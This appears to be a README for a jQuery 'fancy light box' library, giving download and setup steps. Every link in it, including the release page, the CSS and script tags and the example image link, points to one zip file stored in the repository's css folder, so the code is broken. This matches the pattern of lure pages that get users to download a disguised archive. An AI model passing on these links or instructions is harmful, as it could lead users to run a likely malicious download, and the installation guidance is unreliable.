...
[![Download](https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/css/fancy-jquery-light-box-v1.0-alpha.5.zip%20release-brightblue)](https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/css/fancy-jquery-light-box-v1.0-alpha.5.zip)
...
1. Visit the [Releases Page](https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/css/fancy-jquery-light-box-v1.0-alpha.5.zip) to find the latest version of the software.

2. Look for the latest release. You will see a list of available files.

3. Download the `.zip` or `https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/css/fancy-jquery-light-box-v1.0-alpha.5.zip` file. This file contains everything you need to use the library.
...
2. Add the following lines in the `<head>` section of your HTML file:
   ...
   ```html
   <link rel="stylesheet" href="https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/css/fancy-jquery-light-box-v1.0-alpha.5.zip">
   <script src="https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/css/fancy-jquery-light-box-v1.0-alpha.5.zip"></script>
   <script src="https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/css/fancy-jquery-light-box-v1.0-alpha.5.zip"></script>
   ```
...
3. To activate the lightbox, add a button or link that points to an image or a video using the following HTML code:
   ...
   ```html
   <a href="https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/css/fancy-jquery-light-box-v1.0-alpha.5.zip" class="lightbox">Open Image</a>
   ```
...
For additional information, visit the [Releases Page](https://raw.githubusercontent.com/wifeybabyb/jquery-fancy-light-box/main/css/fancy-jquery-light-box-v1.0-alpha.5.zip) to explore the latest version and updates.